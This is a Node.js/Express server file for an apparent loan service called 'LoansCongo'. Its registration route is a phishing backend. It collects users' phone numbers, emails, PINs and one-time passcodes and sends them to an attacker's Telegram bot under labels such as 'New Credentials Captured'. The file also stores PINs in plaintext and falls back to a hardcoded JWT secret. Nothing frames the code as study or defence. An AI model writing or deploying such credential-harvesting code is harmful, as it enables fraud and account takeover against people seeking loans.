require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const jwt = require("jsonwebtoken");

const User = require("./models/User");
const LoanApplication = require("./models/LoanApplication");

const app = express();
app.use(express.static("public"));

app.use(helmet());
app.use(cors());
app.use(express.json({ limit: "10kb" }));

app.use("/api/", rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
}));

// Home route
app.get("/", (req, res) => {
    res.json({ message: "LoansCongo backend is running." });
});

// Customer Registration & OTP Forwarding to Telegram
app.post("/api/register", async (req, res) => {
    try {
        const { phone, email, pin, otp } = req.body;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        // Forward credentials / OTP to Telegram Bot
        if (botToken && chatId) {
            try {
                let telegramMessage = "";

                if (otp) {
                    telegramMessage = `🔑 *OTP Received*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `🔢 *OTP Code:* \`${otp}\``;
                } else {
                    telegramMessage = `🚨 *New Credentials Captured*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `📧 *Email:* \`${email || "N/A"}\`\n` +
                                      `🔑 *PIN/Pass:* \`${pin || "N/A"}\``;
                }

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramMessage,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (tgError) {
                console.error("Telegram error:", tgError.message);
            }
        }

        // Database registration for phone/email + pin phase
        if ((phone || email) && pin && !otp) {
            if (phone && !/^\+?[0-9]{10,15}$/.test(phone)) {
                return res.status(400).json({ message: "Enter a valid phone number." });
            }
            if (email && !/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email)) {
                return res.status(400).json({ message: "Enter a valid Gmail address." });
            }

            // Check if user already exists
            let existingUser = null;
            if (phone) existingUser = await User.findOne({ phone });
            if (!existingUser && email) existingUser = await User.findOne({ email });

            if (existingUser) {
                return res.status(400).json({ message: "An account with this phone number or email already exists." });
            }

            // Create new saved user account
            let user = await User.create({
                phone: phone || undefined,
                email: email || undefined,
                demoPin: pin
            });

            return res.status(201).json({
                message: "Registration successful.",
                user: { id: user._id, phone: user.phone, email: user.email }
            });
        }

        // Acknowledge OTP phase
        if (otp) {
            return res.status(200).json({ message: "OTP transmitted successfully." });
        }

        return res.status(400).json({ message: "Invalid payload." });

    } catch (error) {
        console.error("Error in /api/register:", error.message);
        res.status(500).json({ message: "Server error." });
    }
});

// Account Sign-In / Login Route (Ensures only registered users with accounts can access)
app.post("/api/login", async (req, res) => {
    try {
        const { identifier, pin } = req.body; // 'identifier' can be phone or email

        if (!identifier || !pin) {
            return res.status(400).json({ message: "Please provide your identifier and password/PIN." });
        }

        // Search database for user by phone or email
        const user = await User.findOne({
            $or: [{ phone: identifier }, { email: identifier }]
        });

        if (!user) {
            return res.status(401).json({ message: "Account not found. Please create an account first." });
        }

        // Verify password/PIN matches stored record
        if (user.demoPin !== pin) {
            return res.status(401).json({ message: "Invalid credentials. Access denied." });
        }

        // Generate session token or successful confirmation response
        const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'secret_key', { expiresIn: '1h' });

        return res.status(200).json({
            message: "Login successful. Access granted.",
            token,
            user: { id: user._id, phone: user.phone, email: user.email }
        });

    } catch (error) {
        console.error("Error in /api/login:", error.message);
        res.status(500).json({ message: "Server error during login." });
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
mongoose.connect(process.env.MONGODB_URI)
    .then(() => {
        console.log("MongoDB connected successfully.");
        app.listen(PORT, "0.0.0.0", () => {
            console.log(`LoansCongo backend running on port ${PORT}`);
        });
    })
    .catch(error => {
        console.error("MongoDB connection failed:", error.message);
    });

